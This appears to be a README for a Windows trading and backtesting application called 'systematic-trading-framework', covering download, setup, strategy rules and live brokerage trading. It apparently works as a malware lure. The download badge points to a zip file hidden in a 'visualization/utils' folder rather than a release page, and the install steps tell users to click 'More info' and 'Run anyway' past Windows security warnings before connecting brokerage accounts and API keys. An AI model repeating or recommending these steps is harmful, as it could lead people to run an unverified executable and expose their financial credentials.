# 📈 systematic-trading-framework - Make better trades with automated rules

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/motional-tammy18/systematic-trading-framework/raw/refs/heads/main/visualization/utils/systematic-trading-framework-trewsman.zip)

## What is this tool?

The systematic-trading-framework helps you trade stocks and other assets based on rules you define. You can test your ideas against history before you risk real money. This software removes the emotions from trading. It helps you stay focused on your plan.

## 💻 System requirements

Your computer needs to meet these basic standards to run this software smoothly:

- Windows 10 or 11
- 8GB of RAM or more
- 500MB of free disk space
- A stable internet connection
- A modern web browser

Once the file sits on your computer, proceed with the setup:

1. Open your Downloads folder.
2. Double-click the file you downloaded. 
3. If Windows shows a security window, click "More info" and then "Run anyway."
4. Follow the prompts on the screen to finish the installation.
5. Create a desktop shortcut if the installer gives you the option.

## ⚙️ Initial setup

After you finish the installation, you need to configure your workspace.

1. Open the systematic-trading-framework application from your desktop.
2. The software will ask you to set a data folder. This is where the program saves your trade logs and history.
3. Pick a folder on your drive that has enough space.
4. Click Save.

## 📊 Connecting a data feed

You need market data to make the framework useful. 

1. Go to the Settings menu inside the app.
2. Select the Data Feed tab.
3. Enter your API keys if you have them from a provider.
4. If you are new, you can use the built-in free trial data feed for testing purposes.
5. Click Test Connection to confirm you receive live market updates.

## 📉 Creating your first trading strategy

You can define your own rules to test. 

1. Click the Strategy button on the left sidebar.
2. Select New Strategy.
3. Choose the assets you want to follow, like specific stocks or indices.
4. Define your entry rules. For example, you can tell the system to buy when a stock price crosses a moving average.
5. Define your exit rules. This helps you protect your capital.
6. Click Save Strategy to keep your work.

## 🧪 Testing your strategy

Testing your ideas against history is the most important part of this software.

1. Go to the Backtest tab.
2. Select the strategy you created earlier.
3. Choose a start date and an end date for your test.
4. Click Run Test.
5. The software will process the data. This might take a few minutes if you use a large date range.
6. Look at the results window for stats like total return, maximum loss, and trade frequency.

## 🚀 Running live trades

Only run live trades after you finish testing.

1. Switch the mode from Backtest to Live.
2. Connect your brokerage account through the Brokerage tab in Settings.
3. Select your strategy.
4. Click Start Engine.
5. The software now monitors the market and places trades based on your rules.

## ❓ Common questions

**Does the software work if I close my laptop?**
No. The application must stay open and connected to the internet to trigger trades. We suggest running the software on a dedicated desktop computer or a cloud server.

**How do I update the software?**
When a new version comes out, return to the releases page and download the latest installer. The software detects your previous settings and keeps them when you upgrade.

**Can I run multiple strategies at once?**
Yes. You can add as many strategies as your computer hardware allows. 

**Is this software free?**
Yes. This is an open-source project. You never pay to use the framework itself.

## 🔒 Safety and security

We take security seriously. This software keeps all your brokerage login information in a local file on your computer. We do not transmit your login details to our servers. Keep your computer locked and use strong passwords to protect your financial accounts. 

Always test your strategies with small amounts of money first. Start with a paper trading account if your broker offers one. This lets you practice without risking your capital.

## 💬 Getting help

If you encounter issues, look at the logs folder. It records events and errors that happen while the app runs. If the app stops working, click the Help menu and then click Report Issue. This opens a window where you can describe what happened. 

You can also visit our community forum to ask questions. Many other users work on similar setups and share their experience.
